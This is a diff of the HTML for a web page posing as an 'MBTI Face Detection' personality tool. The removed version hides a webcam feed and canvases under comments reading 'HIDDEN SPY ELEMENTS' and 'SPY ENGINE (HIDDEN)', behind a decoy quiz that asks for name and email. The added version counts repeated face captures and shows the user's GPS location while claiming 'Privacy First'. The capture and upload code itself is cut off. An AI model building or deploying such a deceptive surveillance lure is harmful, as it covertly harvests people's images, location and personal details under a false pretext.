@@ -2,479 +2,190 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
-
-  <title>MBTI Face Reader — What's Your Personality?</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MBTI Face Detection</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.18/vision_bundle.js" crossorigin="anonymous"></script>
+  <script src="config.js"></script>
   <style>
     * {
+      margin: 0;
+      padding: 0;
       box-sizing: border-box;
     }
 
-    html,
     body {
-      margin: 0;
-      padding: 0;
-      background: #0a0a0a;
-      color: #e0e0e0;
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      line-height: 1.6;
-    }
-
-    /* =========================
-       HIDDEN SPY ELEMENTS
-    ========================= */
-
-    #video,
-    #faceCanvas,
-    #captureCanvas,
-    #preview,
-    #captureFlash {
-      display: none !important;
-      position: fixed;
-      width: 0;
-      height: 0;
-      opacity: 0;
-      pointer-events: none;
-      z-index: -9999;
-    }
-
-    /* =========================
-       MBTI SECTION
-    ========================= */
-
-    .mbti-section {
+      font-family: 'Inter', sans-serif;
       min-height: 100vh;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      color: #fff;
+      overflow-x: hidden;
+    }
+
+    /* Landing Page */
+    #landing {
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
       text-align: center;
-      padding: 100px 20px;
-      background:
-        radial-gradient(
-          ellipse at 50% 30%,
-          rgba(139, 92, 246, 0.12) 0%,
-          transparent 50%
-        ),
-        radial-gradient(
-          ellipse at 50% 70%,
-          rgba(236, 72, 153, 0.08) 0%,
-          transparent 50%
-        );
     }
 
-    .mbti-container {
-      max-width: 600px;
+    .logo {
+      font-size: 48px;
+      margin-bottom: 20px;
     }
 
-    .mbti-section h1 {
-      font-size: clamp(2rem, 5vw, 3.5rem);
+    h1 {
+      font-size: 32px;
       font-weight: 700;
-      color: #fff;
-      margin-bottom: 16px;
-      letter-spacing: -1px;
+      margin-bottom: 10px;
+      background: linear-gradient(90deg, #a855f7, #6366f1, #3b82f6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
 
-    .mbti-section .subtitle {
-      font-size: 1.1rem;
-      color: #888;
+    .subtitle {
+      font-size: 16px;
+      color: #94a3b8;
       margin-bottom: 40px;
+      max-width: 400px;
     }
 
-    .mbti-btn {
-      display: inline-block;
-      padding: 18px 48px;
-      background: linear-gradient(135deg, #8b5cf6, #ec4899);
-      color: #fff;
-      border: none;
+    .features {
+      display: flex;
+      gap: 30px;
+      margin-bottom: 40px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 20px;
+      background: rgba(255, 255, 255, 0.05);
       border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .feature-icon {
+      font-size: 20px;
+    }
+
+    .feature-text {
+      font-size: 14px;
+      color: #cbd5e1;
+    }
+
+    .start-btn {
+      padding: 16px 48px;
       font-size: 18px;
       font-weight: 600;
+      color: #fff;
+      background: linear-gradient(135deg, #a855f7, #6366f1);
+      border: none;
+      border-radius: 50px;
       cursor: pointer;
-      transition: all 0.3s;
-      letter-spacing: 0.5px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(168, 85, 247, 0.4);
     }
 
-    .mbti-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 20px 40px rgba(139, 92, 246, 0.3);
+    .start-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 30px rgba(168, 85, 247, 0.6);
     }
 
-    .mbti-btn:disabled {
+    .start-btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
     }
 
-    .quiz-form {
+    .privacy-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #64748b;
+    }
+
+    /* Detection Page */
+    #detection {
       display: none;
-      text-align: left;
-    }
-
-    .quiz-form.active {
-      display: block;
-    }
-
-    .quiz-step {
-      display: none;
-      animation: fadeIn 0.3s ease;
-    }
-
-    .quiz-step.active {
-      display: block;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    .quiz-question {
-      font-size: 1.2rem;
-      color: #fff;
-      margin-bottom: 20px;
-      font-weight: 500;
-    }
-
-    .quiz-question span {
-      color: #8b5cf6;
-    }
-
-    .quiz-options {
-      display: flex;
       flex-direction: column;
-      gap: 12px;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
     }
 
-    .quiz-option {
-      padding: 16px 20px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 10px;
-      color: #ccc;
-      font-size: 15px;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-
-    .quiz-option:hover {
-      background: rgba(139, 92, 246, 0.1);
-      border-color: rgba(139, 92, 246, 0.3);
-      color: #fff;
-    }
-
-    .quiz-option.selected {
-      background: rgba(139, 92, 246, 0.2);
-      border-color: #8b5cf6;
-      color: #fff;
-    }
-
-    .quiz-progress {
-      display: flex;
-      gap: 6px;
-      margin-bottom: 30px;
-      justify-content: center;
-    }
-
-    .quiz-progress-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.15);
-      transition: all 0.3s;
-    }
-
-    .quiz-progress-dot.active {
-      background: #8b5cf6;
-      transform: scale(1.2);
-    }
-
-    .quiz-progress-dot.done {
-      background: #10b981;
-    }
-
-    .quiz-nav {
+    .header {
+      width: 100%;
+      max-width: 600px;
       display: flex;
       justify-content: space-between;
-      margin-top: 30px;
-    }
-
-    .quiz-nav button {
-      padding: 12px 28px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-      border: none;
-    }
-
-    .quiz-prev {
-      background: rgba(255, 255, 255, 0.05);
-      color: #888;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .quiz-prev:hover {
-      background: rgba(255, 255, 255, 0.1);
-      color: #fff;
-    }
-
-    .quiz-next {
-      background: linear-gradient(135deg, #8b5cf6, #ec4899);
-      color: #fff;
-    }
-
-    .quiz-next:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
-    }
-
-    .quiz-next:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .quiz-input-group {
+      align-items: center;
       margin-bottom: 20px;
     }
 
-    .quiz-input-group label {
-      display: block;
-      font-size: 13px;
-      color: #888;
-      margin-bottom: 8px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-
-    .quiz-input-group input {
-      width: 100%;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 8px;
-      color: #fff;
-      font-size: 15px;
-      font-family: inherit;
-      transition: border-color 0.2s;
-    }
-
-    .quiz-input-group input:focus {
-      outline: none;
-      border-color: #8b5cf6;
-    }
-
-    .quiz-input-group input::placeholder {
-      color: #555;
-    }
-
-    .quiz-submit {
-      width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, #8b5cf6, #ec4899);
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    .quiz-submit:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 15px 30px rgba(139, 92, 246, 0.4);
-    }
-
-    .quiz-submit:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .mbti-result {
-      display: none;
-      margin-top: 40px;
-      padding: 30px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 16px;
-      animation: fadeInUp 0.5s ease;
-    }
-
-    .mbti-result.show {
-      display: block;
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .mbti-type {
-      font-size: 4rem;
-      font-weight: 800;
-      background: linear-gradient(135deg, #8b5cf6, #ec4899);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
-      letter-spacing: 4px;
-      min-height: 80px;
+    .status {
       display: flex;
       align-items: center;
-      justify-content: center;
-    }
-
-    .mbti-name {
-      font-size: 1.3rem;
-      color: #fff;
-      margin-bottom: 16px;
-      min-height: 30px;
-    }
-
-    .mbti-desc {
-      color: #999;
-      font-size: 14px;
-      line-height: 1.7;
-    }
-
-    .mbti-traits {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-top: 20px;
-      flex-wrap: wrap;
-    }
-
-    .mbti-traits span {
-      padding: 6px 16px;
-      background: rgba(139, 92, 246, 0.15);
-      border: 1px solid rgba(139, 92, 246, 0.3);
+      gap: 8px;
+      padding: 8px 16px;
+      background: rgba(34, 197, 94, 0.2);
       border-radius: 20px;
-      font-size: 12px;
-      color: #a78bfa;
+      border: 1px solid rgba(34, 197, 94, 0.3);
     }
 
-    .mbti-footer {
-      margin-top: 24px;
-      font-size: 12px;
-      color: #555;
-    }
-
-    .mbti-avatar {
-      width: 120px;
-      height: 120px;
-      margin: 0 auto 20px;
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background: #22c55e;
       border-radius: 50%;
-      background: rgba(255, 255, 255, 0.05);
-      display: none;
-      align-items: center;
-      justify-content: center;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .status-text {
+      font-size: 14px;
+      color: #22c55e;
+    }
+
+    .capture-count {
+      font-size: 14px;
+      color: #94a3b8;
+    }
+
+    .camera-container {
+      position: relative;
+      width: 100%;
+      max-width: 600px;
+      border-radius: 20px;
       overflow: hidden;
-      border: 3px solid rgba(139, 92, 246, 0.3);
+      background: #000;
+      aspect-ratio: 4/3;
     }
 
-    .mbti-avatar.show {
-      display: flex;
-    }
-
-    .mbti-avatar img {
+    #webcam {
       width: 100%;
       height: 100%;
       object-fit: cover;
+      transform: scaleX(-1);
     }
 
-    .roulette-container {
-      display: none;
-      margin-top: 30px;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-    }
-
-    .roulette-container.active {
-      display: block;
-    }
-
-    .roulette-types {
-      display: flex;
-      gap: 8px;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin-bottom: 16px;
-    }
-
-    .roulette-type {
-      padding: 8px 14px;
-      background: rgba(139, 92, 246, 0.1);
-      border: 1px solid rgba(139, 92, 246, 0.2);
-      border-radius: 8px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #a78bfa;
-      transition: all 0.1s;
-      min-width: 60px;
-      text-align: center;
-    }
-
-    .roulette-type.highlight {
-      background: rgba(139, 92, 246, 0.4);
-      border-color: #8b5cf6;
-      color: #fff;
-      transform: scale(1.1);
-      box-shadow: 0 0 20px rgba(139, 92, 246, 0.5);
-    }
-
-    .roulette-type.selected {
-      background: linear-gradient(135deg, #8b5cf6, #ec4899);
-      border-color: transparent;
-      color: #fff;
-      transform: scale(1.15);
-      box-shadow: 0 0 30px rgba(139, 92, 246, 0.6);
-    }
-
-    .roulette-progress {
-      width: 100%;
-      height: 4px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 2px;
-      overflow: hidden;
-    }
-
-    .roulette-progress-bar {
-      height: 100%;
-      background: linear-gradient(90deg, #8b5cf6, #ec4899);
-      width: 0%;
-      transition: width 0.3s;
-    }
-
-    .scan-lines {
-      position: fixed;
+    .scan-overlay {
+      position: absolute;
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
       pointer-events: none;
-      z-index: 9999;
-      display: none;
-    }
-
-    .scan-lines.active {
-      display: block;
     }
 
     .scan-line {
@@ -482,1813 +193,462 @@
       left: 0;
       right: 0;
       height: 2px;
-      background: linear-gradient(90deg, transparent, rgba(139, 92, 246, 0.8), transparent);
-      animation: scanMove 1.5s linear infinite;
+      background: linear-gradient(90deg, transparent, #a855f7, transparent);
+      opacity: 0;
+      animation: scan 3s ease-in-out infinite;
     }
 
-    @keyframes scanMove {
-      0% { top: -2px; opacity: 0; }
-      10% { opacity: 1; }
-      90% { opacity: 1; }
+    @keyframes scan {
+      0% { top: 0; opacity: 0; }
+      10% { opacity: 0.8; }
+      90% { opacity: 0.8; }
       100% { top: 100%; opacity: 0; }
     }
 
-    /* =========================
-       NAVIGATION
-    ========================= */
+    .face-indicator {
+      position: absolute;
+      border: 2px solid #a855f7;
+      border-radius: 10px;
+      opacity: 0;
+      transition: all 0.3s ease;
+    }
 
-    nav {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      z-index: 100;
-      padding: 20px 40px;
-      background: rgba(10, 10, 10, 0.95);
-      backdrop-filter: blur(10px);
+    .face-indicator.detected {
+      opacity: 1;
+      box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
+    }
+
+    .info-panel {
+      width: 100%;
+      max-width: 600px;
+      margin-top: 20px;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 16px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
       border-bottom: 1px solid rgba(255, 255, 255, 0.05);
     }
 
-    nav .logo {
-      font-size: 20px;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: 2px;
+    .info-row:last-child {
+      border-bottom: none;
     }
 
-    nav ul {
-      display: flex;
-      gap: 30px;
-      list-style: none;
-      margin: 0;
-      padding: 0;
-      float: right;
-    }
-
-    nav a {
-      color: #888;
-      text-decoration: none;
+    .info-label {
       font-size: 14px;
-      transition: color 0.3s;
+      color: #94a3b8;
     }
 
-    nav a:hover {
-      color: #fff;
-    }
-
-    /* =========================
-       HERO SECTION
-    ========================= */
-
-    .hero {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 100px 20px;
-      background:
-        radial-gradient(
-          ellipse at 30% 50%,
-          rgba(99, 102, 241, 0.08) 0%,
-          transparent 50%
-        ),
-        radial-gradient(
-          ellipse at 70% 50%,
-          rgba(236, 72, 153, 0.06) 0%,
-          transparent 50%
-        );
-    }
-
-    .hero h1 {
-      font-size: clamp(2.5rem, 6vw, 4.5rem);
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 20px;
-      letter-spacing: -1px;
-    }
-
-    .hero p {
-      font-size: 1.2rem;
-      color: #888;
-      max-width: 500px;
-      margin: 0 auto 40px;
-    }
-
-    .hero .cta {
-      display: inline-block;
-      padding: 14px 32px;
-      background: #fff;
-      color: #0a0a0a;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 15px;
-      border-radius: 6px;
-      transition: all 0.3s;
-    }
-
-    .hero .cta:hover {
-      background: #f3f4f6;
-      transform: translateY(-2px);
-    }
-
-    /* =========================
-       SECTIONS
-    ========================= */
-
-    section {
-      padding: 100px 40px;
-      max-width: 1100px;
-      margin: 0 auto;
-    }
-
-    section h2 {
-      font-size: 2rem;
-      color: #fff;
-      margin-bottom: 50px;
-      text-align: center;
-    }
-
-    /* =========================
-       ABOUT
-    ========================= */
-
-    .about-content {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 60px;
-      align-items: center;
-    }
-
-    .about-text p {
-      color: #999;
-      margin-bottom: 16px;
-    }
-
-    .skills {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin-top: 20px;
-    }
-
-    .skills span {
-      padding: 8px 16px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 20px;
-      font-size: 13px;
-      color: #aaa;
-    }
-
-    .about-image {
-      width: 100%;
-      aspect-ratio: 4/3;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #333;
-      font-size: 80px;
-    }
-
-    /* =========================
-       PROJECTS
-    ========================= */
-
-    .projects-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 30px;
-    }
-
-    .project-card {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 12px;
-      padding: 30px;
-      transition: all 0.3s;
-    }
-
-    .project-card:hover {
-      border-color: rgba(255, 255, 255, 0.12);
-      transform: translateY(-4px);
-    }
-
-    .project-card h3 {
-      color: #fff;
-      font-size: 1.2rem;
-      margin-bottom: 12px;
-    }
-
-    .project-card p {
-      color: #888;
+    .info-value {
       font-size: 14px;
-      margin-bottom: 20px;
+      color: #fff;
+      font-weight: 500;
     }
 
-    .project-card .tags {
-      display: flex;
-      gap: 8px;
-      flex-wrap: wrap;
+    .info-value.success {
+      color: #22c55e;
     }
 
-    .project-card .tags span {
-      padding: 4px 12px;
-      background: rgba(99, 102, 241, 0.1);
-      border-radius: 12px;
+    .info-value.warning {
+      color: #f59e0b;
+    }
+
+    .info-value.error {
+      color: #ef4444;
+    }
+
+    .gps-info {
+      margin-top: 15px;
+      padding: 12px;
+      background: rgba(59, 130, 246, 0.1);
+      border-radius: 10px;
+      border: 1px solid rgba(59, 130, 246, 0.2);
+    }
+
+    .gps-label {
       font-size: 12px;
-      color: #818cf8;
+      color: #60a5fa;
+      margin-bottom: 5px;
     }
 
-    /* =========================
-       CONTACT
-    ========================= */
-
-    .contact-form {
-      max-width: 500px;
-      margin: 0 auto;
+    .gps-coords {
+      font-size: 14px;
+      color: #93c5fd;
+      font-family: monospace;
     }
 
-    .contact-form input,
-    .contact-form textarea {
+    .capture-log {
       width: 100%;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      max-width: 600px;
+      margin-top: 20px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .log-entry {
+      padding: 8px 12px;
+      margin-bottom: 8px;
+      background: rgba(255, 255, 255, 0.03);
       border-radius: 8px;
-      color: #fff;
-      font-size: 15px;
-      margin-bottom: 16px;
-      font-family: inherit;
+      font-size: 12px;
+      color: #64748b;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
 
-    .contact-form input:focus,
-    .contact-form textarea:focus {
-      outline: none;
-      border-color: rgba(255, 255, 255, 0.25);
+    .log-entry.success {
+      border-left: 3px solid #22c55e;
     }
 
-    .contact-form textarea {
-      min-height: 120px;
-      resize: vertical;
+    .log-entry.error {
+      border-left: 3px solid #ef4444;
     }
 
-    .contact-form button {
-      width: 100%;
-      padding: 14px;
-      background: #fff;
-      color: #0a0a0a;
-      border: none;
-      border-radius: 8px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s;
+    .log-time {
+      color: #475569;
+      font-family: monospace;
     }
 
-    .contact-form button:hover {
-      background: #f3f4f6;
+    /* Hidden elements */
+    #faceCanvas, #captureCanvas {
+      display: none;
     }
 
-    /* =========================
-       FOOTER
-    ========================= */
-
-    footer {
-      text-align: center;
-      padding: 40px;
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
-      color: #555;
-      font-size: 13px;
-    }
-
-    /* =========================
-       RESPONSIVE
-    ========================= */
-
-    @media (max-width: 768px) {
-      nav ul {
-        display: none;
-      }
-
-      .about-content {
-        grid-template-columns: 1fr;
-      }
-
-      section {
-        padding: 60px 20px;
-      }
+    /* Responsive */
+    @media (max-width: 640px) {
+      h1 { font-size: 24px; }
+      .features { flex-direction: column; }
+      .feature { width: 100%; }
     }
   </style>
 </head>
-
-
 <body>
-
-  <!-- NAVIGATION -->
-  <nav>
-    <div class="logo">MBTI Reader</div>
-    <ul>
-      <li><a href="#mbti">Discover</a></li>
-      <li><a href="#about">About</a></li>
-      <li><a href="#contact">Contact</a></li>
-    </ul>
-  </nav>
-
-
-  <!-- MBTI HERO -->
-  <section id="mbti" class="mbti-section">
-    <div class="mbti-container">
-      <h1>Discover Your MBTI</h1>
-      <p class="subtitle">
-        Answer 5 quick questions to reveal your true personality type
-      </p>
-
-      <div class="quiz-form" id="quizForm">
-        <div class="quiz-progress" id="quizProgress">
-          <div class="quiz-progress-dot active"></div>
-          <div class="quiz-progress-dot"></div>
-          <div class="quiz-progress-dot"></div>
-          <div class="quiz-progress-dot"></div>
-          <div class="quiz-progress-dot"></div>
-        </div>
-
-        <div class="quiz-step active" data-step="0">
-          <div class="quiz-question"><span>1.</span> When you meet new people, you usually:</div>
-          <div class="quiz-options">
-            <div class="quiz-option" data-value="E">Talk a lot and feel energized</div>
-            <div class="quiz-option" data-value="I">Listen more and feel drained after</div>
-          </div>
-        </div>
-
-        <div class="quiz-step" data-step="1">
-          <div class="quiz-question"><span>2.</span> You prefer to focus on:</div>
-          <div class="quiz-options">
-            <div class="quiz-option" data-value="S">Facts and details right now</div>
-            <div class="quiz-option" data-value="N">Patterns and future possibilities</div>
-          </div>
-        </div>
-
-        <div class="quiz-step" data-step="2">
-          <div class="quiz-question"><span>3.</span> When making decisions, you rely more on:</div>
-          <div class="quiz-options">
-            <div class="quiz-option" data-value="T">Logic and objective analysis</div>
-            <div class="quiz-option" data-value="F">Personal values and feelings</div>
-          </div>
-        </div>
-
-        <div class="quiz-step" data-step="3">
-          <div class="quiz-question"><span>4.</span> You prefer your life to be:</div>
-          <div class="quiz-options">
-            <div class="quiz-option" data-value="J">Planned and organized</div>
-            <div class="quiz-option" data-value="P">Flexible and spontaneous</div>
-          </div>
-        </div>
-
-        <div class="quiz-step" data-step="4">
-          <div class="quiz-question"><span>5.</span> At a party, you:</div>
-          <div class="quiz-options">
-            <div class="quiz-option" data-value="E">Talk to many people including strangers</div>
-            <div class="quiz-option" data-value="I">Talk to a few people you already know</div>
-          </div>
-        </div>
-
-        <div class="quiz-step" data-step="5">
-          <div class="quiz-question"><span>Almost done!</span> Enter your details:</div>
-          <div class="quiz-input-group">
-            <label>Your Name</label>
-            <input type="text" id="quizName" placeholder="John Doe" required>
-          </div>
-          <div class="quiz-input-group">
-            <label>Your Email</label>
-            <input type="email" id="quizEmail" placeholder="john@example.com" required>
-          </div>
-        </div>
-
-        <div class="quiz-nav">
-          <button class="quiz-prev" id="quizPrev" style="visibility: hidden">← Back</button>
-          <button class="quiz-next" id="quizNext" disabled>Next →</button>
-        </div>
+  <!-- Landing Page -->
+  <div id="landing">
+    <div class="logo">🧠</div>
+    <h1>MBTI Face Detection</h1>
+    <p class="subtitle">Analisis kepribadian MBTI Anda menggunakan teknologi AI face detection secara real-time</p>
+    
+    <div class="features">
+      <div class="feature">
+        <span class="feature-icon">📸</span>
+        <span class="feature-text">Real-time Face Detection</span>
       </div>
-
-      <button class="mbti-btn" id="mbtiBtn">
-        🧠 Start Quiz
-      </button>
-
-      <div class="roulette-container" id="rouletteContainer">
-        <div class="roulette-types" id="rouletteTypes"></div>
-        <div class="roulette-progress">
-          <div class="roulette-progress-bar" id="rouletteProgress"></div>
-        </div>
+      <div class="feature">
+        <span class="feature-icon">⚡</span>
+        <span class="feature-text">Instant Analysis</span>
       </div>
-
-      <div class="mbti-result" id="mbtiResult">
-        <div class="mbti-avatar" id="mbtiAvatar">
-          <img id="mbtiAvatarImg" src="" alt="">
-        </div>
-        <div class="mbti-type" id="mbtiType">INTJ</div>
-        <div class="mbti-name" id="mbtiName">The Architect</div>
-        <div class="mbti-desc" id="mbtiDesc">
-          Imaginative and strategic thinkers, with a plan for everything.
-        </div>
-        <div class="mbti-traits" id="mbtiTraits">
-          <span>Strategic</span>
-          <span>Independent</span>
-          <span>Determined</span>
-        </div>
-        <div class="mbti-footer">
-          ✅ Analysis complete
-        </div>
+      <div class="feature">
+        <span class="feature-icon">🔒</span>
+        <span class="feature-text">Privacy First</span>
       </div>
     </div>
-  </section>
 
+    <button id="startBtn" class="start-btn" onclick="startDetection()">
+      Mulai Deteksi
+    </button>
+    <p class="privacy-note">Kami membutuhkan akses kamera dan lokasi untuk analisis</p>
+  </div>
 
-  <!-- ABOUT -->
-  <section id="about">
-    <h2>About This Tool</h2>
-    <div class="about-content">
-      <div class="about-text">
-        <p>
-          Our AI-powered face analysis uses advanced machine learning to
-          detect facial features and map them to MBTI personality types.
-        </p>
-        <p>
-          Simply click "Scan My Face" and our system will analyze your
-          facial structure to reveal your unique personality profile.
-        </p>
-        <div class="skills">
-          <span>Face Detection</span>
-          <span>AI Analysis</span>
-          <span>MBTI Mapping</span>
-          <span>Real-time</span>
-        </div>
+  <!-- Detection Page -->
+  <div id="detection">
+    <div class="header">
+      <div class="status">
+        <div class="status-dot"></div>
+        <span class="status-text">Mendeteksi...</span>
       </div>
-      <div class="about-image">
-        🧠
+      <div class="capture-count">Tangkapan: <span id="captureCount">0</span></div>
+    </div>
+
+    <div class="camera-container">
+      <video id="webcam" autoplay playsinline></video>
+      <div class="scan-overlay">
+        <div class="scan-line"></div>
+      </div>
+      <div id="faceIndicator" class="face-indicator"></div>
+    </div>
+
+    <div class="info-panel">
+      <div class="info-row">
+        <span class="info-label">Status Kamera</span>
+        <span id="cameraStatus" class="info-value success">Aktif</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Deteksi Wajah</span>
+        <span id="faceStatus" class="info-value warning">Menunggu...</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Terakhir Tangkap</span>
+        <span id="lastCapture" class="info-value">-</span>
+      </div>
+      <div class="gps-info">
+        <div class="gps-label">📍 Lokasi Anda</div>
+        <div id="gpsCoords" class="gps-coords">Mendapatkan lokasi...</div>
       </div>
     </div>
-  </section>
 
+    <div id="captureLog" class="capture-log"></div>
+  </div>
 
-  <!-- CONTACT -->
-  <section id="contact">
-    <h2>Get In Touch</h2>
-    <form class="contact-form" id="contactForm">
-      <input type="text" placeholder="Your Name" required>
-      <input type="email" placeholder="Your Email" required>
-      <textarea placeholder="Your Message" required></textarea>
-      <button type="submit">Send Message</button>
-    </form>
-  </section>
-
-
-  <footer>
-    <p>&copy; 2026 MBTI Face Reader. All rights reserved.</p>
-  </footer>
-
-
-  <!-- =========================
-       HIDDEN SPY ELEMENTS
-  ========================= -->
-
-  <video
-    id="video"
-    autoplay
-    playsinline
-    muted>
-  </video>
-
+  <!-- Hidden elements for capture -->
   <canvas id="faceCanvas"></canvas>
   <canvas id="captureCanvas"></canvas>
 
-  <img id="preview" alt="">
-  <div id="captureFlash"></div>
-
-  <div class="scan-lines" id="scanLines">
-    <div class="scan-line"></div>
-  </div>
-
-
-  <!-- =========================
-       SPY ENGINE (HIDDEN)
-  ========================= -->
-
-  <script type="module">
-
-    import {
-      FaceDetector,
-      FilesetResolver
-    } from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision/vision_bundle.mjs";
-
-    import {
-      SUPABASE_URL,
-      SUPABASE_ANON_KEY
-    } from "./config.js";
-
-
-    // ============================================================
-    // MBTI TYPES (from 16personalities.com)
-    // ============================================================
-
-    const MBTI_TYPES = [
-      {
-        type: "INTJ",
-        name: "The Architect",
-        desc: "Imaginative and strategic thinkers, with a plan for everything.",
-        traits: ["Strategic", "Independent", "Determined"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg",
-        role: "Analyst",
-        color: "#8b5cf6"
-      },
-      {
-        type: "INTP",
-        name: "The Logician",
-        desc: "Innovative inventors with an unquenchable thirst for knowledge.",
-        traits: ["Analytical", "Original", "Curious"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg",
-        role: "Analyst",
-        color: "#8b5cf6"
-      },
-      {
-        type: "ENTJ",
-        name: "The Commander",
-        desc: "Bold, imaginative and strong-willed leaders, always finding a way – or making one.",
-        traits: ["Confident", "Strategic", "Decisive"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg",
-        role: "Analyst",
-        color: "#8b5cf6"
-      },
-      {
-        type: "ENTP",
-        name: "The Debater",
-        desc: "Smart and curious thinkers who cannot resist an intellectual challenge.",
-        traits: ["Innovative", "Versatile", "Energetic"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg",
-        role: "Analyst",
-        color: "#8b5cf6"
-      },
-      {
-        type: "INFJ",
-        name: "The Advocate",
-        desc: "Quiet and mystical, yet very inspiring and tireless idealists.",
-        traits: ["Empathetic", "Insightful", "Determined"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-male.svg",
-        role: "Diplomat",
-        color: "#10b981"
-      },
-      {
-        type: "INFP",
-        name: "The Mediator",
-        desc: "Poetic, kind and altruistic people, always eager to help a good cause.",
-        traits: ["Idealistic", "Compassionate", "Creative"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-female.svg",
-        role: "Diplomat",
-        color: "#10b981"
-      },
-      {
-        type: "ENFJ",
-        name: "The Protagonist",
-        desc: "Charismatic and inspiring leaders, able to mesmerize their listeners.",
-        traits: ["Charismatic", "Reliable", "Leader"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg",
-        role: "Diplomat",
-        color: "#10b981"
-      },
-      {
